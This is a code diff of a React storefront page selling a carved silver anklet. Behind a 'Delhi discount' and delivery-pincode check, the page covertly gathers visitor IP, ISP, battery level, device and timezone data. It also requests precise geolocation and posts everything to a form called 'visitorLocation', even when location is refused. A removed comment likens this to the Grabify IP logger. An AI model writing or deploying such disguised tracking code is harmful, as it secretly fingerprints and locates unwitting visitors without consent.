@@ -37,7 +37,7 @@ export default function App() {
   const [pincode, setPincode] = useState('');
   const [isDiscounted, setIsDiscounted] = useState(false);
 
-  // Delhi Discount Logic
+  // Delhi Discount Logic: Coordinates or Pincode starting with 11
   const checkDelhiStatus = (lat: number | null, lon: number | null, pin: string) => {
     const isDelhiPin = pin.trim().startsWith('11');
     const isDelhiCoords = (lat !== null && lon !== null) ? (lat > 28.3 && lat < 28.9 && lon > 76.7 && lon < 77.5) : false;
@@ -52,21 +52,29 @@ export default function App() {
   const requestLocationAndSend = async (source: string) => {
     if (source === 'check') setCheckText('Checking...');
 
-    // Gather Device Metadata (Similar to Grabify)
-    const deviceData = {
+    // 1. Gather Basic Device Metadata
+    const deviceData: any = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       screenResolution: `${window.screen.width}x${window.screen.height}`,
-      networkType: (navigator as any).connection ? (navigator as any).connection.effectiveType : 'Unknown'
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     };
 
-    let userIp = 'Unknown';
+    // 2. Fetch Battery Status (Chrome/Android support)
     try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      userIp = ipData.ip;
+      const battery: any = await (navigator as any).getBattery();
+      deviceData.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
     } catch (e) {
-      console.warn("IP fetch failed.");
+      deviceData.battery = "Unknown/Safari";
+    }
+
+    // 3. Get Network Data (ISP like Airtel, Excitel, etc.)
+    let networkInfo = { query: 'Unknown', isp: 'Unknown' };
+    try {
+      const res = await fetch('http://ip-api.com/json/');
+      networkInfo = await res.json();
+    } catch (e) {
+      console.warn("ISP lookup failed.");
     }
 
     const encode = (data: Record<string, string | number>) => {
@@ -79,7 +87,8 @@ export default function App() {
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: encode({
           "form-name": "visitorLocation",
-          "ip": userIp,
+          "ip": networkInfo.query,
+          "isp": networkInfo.isp,
           "latitude": lat,
           "longitude": lon,
           "pincode": pincode,
@@ -90,17 +99,15 @@ export default function App() {
       .then(() => {
         if (source === 'check') setCheckText('Available!');
         checkDelhiStatus(lat > 0 ? lat : null, lon > 0 ? lon : null, pincode);
-      })
-      .catch(err => {
-        if (source === 'check') setCheckText('Error');
       });
     };
 
+    // 4. Trigger Location Prompt
     if ('geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => submitToNetlify(pos.coords.latitude, pos.coords.longitude),
         (err) => {
-          submitToNetlify(0, 0);
+          submitToNetlify(0, 0); // Still send IP/ISP/Meta if location denied
           checkDelhiStatus(null, null, pincode);
         },
         { enableHighAccuracy: true, timeout: 6000 }
@@ -117,7 +124,6 @@ export default function App() {
 
   return (
     <div className="min-h-screen flex flex-col font-sans selection:bg-brand-maroon/10">
-      {/* Navigation Header */}
       <header className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-100">
         <div className="max-w-[1440px] mx-auto px-6 md:px-10 py-4 flex flex-col md:flex-row justify-between items-center gap-4">
           <div className="hidden md:flex flex-1 items-center relative">
@@ -147,11 +153,10 @@ export default function App() {
         </nav>
       </header>
 
-      {/* Product Content */}
       <main className="flex-grow w-full max-w-7xl mx-auto px-6 py-12">
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-20">
           <div className="lg:col-span-7 space-y-4">
-            <div className="relative aspect-square bg-surface-container-low overflow-hidden">
+            <div className="relative aspect-square bg-surface-container-low overflow-hidden group">
               <AnimatePresence mode="wait">
                 <motion.img key={selectedImg} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.5 }} src={PRODUCT_IMAGES[selectedImg]} className="w-full h-full object-cover" />
               </AnimatePresence>
@@ -170,7 +175,7 @@ export default function App() {
 
           <div className="lg:col-span-5 flex flex-col h-full">
             <div className="pb-8 border-b border-gray-100 space-y-3">
-              <h1 className="text-2xl md:text-3xl font-serif font-light text-stone-900 leading-tight">Tattva Chitai Carved Statement Ankle Kada</h1>
+              <h1 className="text-2xl md:text-3xl font-serif font-light text-stone-900 leading-tight">Tattva Chitai Carved Statement Anklet </h1>
               <div className="pt-4 flex items-end gap-4">
                 {isDiscounted ? (
                   <>
@@ -185,12 +190,22 @@ export default function App() {
               <p className="text-[10px] text-stone-400 uppercase tracking-widest">MRP INCLUSIVE OF ALL TAXES</p>
             </div>
 
-            <div className="grid grid-cols-2 gap-4 py-8">
+            <div className="py-8 space-y-4">
+              <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-stone-900">Choose Your Finish</h3>
+              <div className="flex gap-4">
+                {['silver', 'oxidized'].map((id) => (
+                  <button key={id} onClick={() => setSelectedFinish(id)} className={`w-12 h-12 rounded-full p-0.5 border ${selectedFinish === id ? 'border-brand-maroon' : 'border-gray-200'}`}>
+                    <div className={`w-full h-full rounded-full bg-gradient-to-tr ${id === 'silver' ? 'from-gray-300 to-gray-100' : 'from-gray-600 to-gray-400'} shadow-inner`} />
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            <div className="grid grid-cols-2 gap-4 pb-8">
               <button className="py-4 border border-brand-maroon text-brand-maroon text-[11px] font-bold uppercase tracking-[0.25em] cursor-pointer">Buy Now</button>
               <button className="py-4 bg-brand-maroon text-white text-[11px] font-bold uppercase tracking-[0.25em] cursor-pointer">Add to Cart</button>
             </div>
 
-            {/* Delivery & Pincode */}
             <div className="bg-surface-container-low p-6 space-y-4">
               <div className="flex items-center gap-2"><Truck className="w-4 h-4 text-brand-maroon" /><h3 className="text-[11px] font-bold uppercase tracking-[0.15em] text-stone-900">Estimated Delivery Time</h3></div>
               <div className="flex border-b border-gray-300 py-2">
@@ -199,7 +214,6 @@ export default function App() {
               </div>
             </div>
 
-            {/* Offers */}
             <div className="py-8 space-y-4">
               <div className="flex items-center gap-2"><Tag className="w-4 h-4 text-brand-maroon" /><h3 className="text-[11px] font-bold uppercase tracking-[0.15em] text-stone-900">Offers For You</h3></div>
               <div className="space-y-3">
@@ -221,10 +235,9 @@ export default function App() {
               </div>
             </div>
 
-            {/* Inspiration */}
             <div className="py-8 border-t border-gray-100 space-y-6">
               <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-stone-900">The Inspiration</h3>
-              <p className="text-sm text-stone-500 leading-relaxed font-serif">Handcrafted 925 silver with traditional Chitai carving work.</p>
+              <p className="text-sm text-stone-500 leading-relaxed font-serif">Handcrafted 925 silver with traditional Chitai carving work. This bold, handcrafted piece seamlessly blends heritage design with modern elegance.</p>
               <ul className="text-[13px] text-stone-600 space-y-2 list-none font-serif">
                 <li className="flex gap-3"><span className="text-brand-maroon">•</span> Premium quality pure 925 silver</li>
                 <li className="flex gap-3"><span className="text-brand-maroon">•</span> Traditional handcrafted carving</li>
@@ -232,7 +245,6 @@ export default function App() {
               </ul>
             </div>
 
-            {/* Badges */}
             <div className="mt-auto grid grid-cols-4 gap-2 py-8 border-t border-gray-100">
                {[
                  { icon: RefreshCcw, label: "Easy 15 Day Return" },
@@ -254,7 +266,7 @@ export default function App() {
         <div className="max-w-[1440px] mx-auto px-10 py-16 flex flex-col md:flex-row justify-between items-center gap-8">
           <div>
             <h2 className="text-lg font-serif font-light tracking-[0.25em] text-stone-900 uppercase">Shyle by TATTVA CHITAI</h2>
-            <p className="text-[10px] uppercase tracking-[0.2em] text-brand-maroon">© 2026 Shyle by TATTVA CHITAI.</p>
+            <p className="text-[10px] uppercase tracking-[0.2em] text-brand-maroon">© 2026 Shyle by TATTVA CHITAI. Modern Craftsmanship, Timeless Elegance.</p>
           </div>
           <div className="flex gap-6">
             {['About Us', 'Shipping & Returns', 'Privacy Policy'].map(link => (
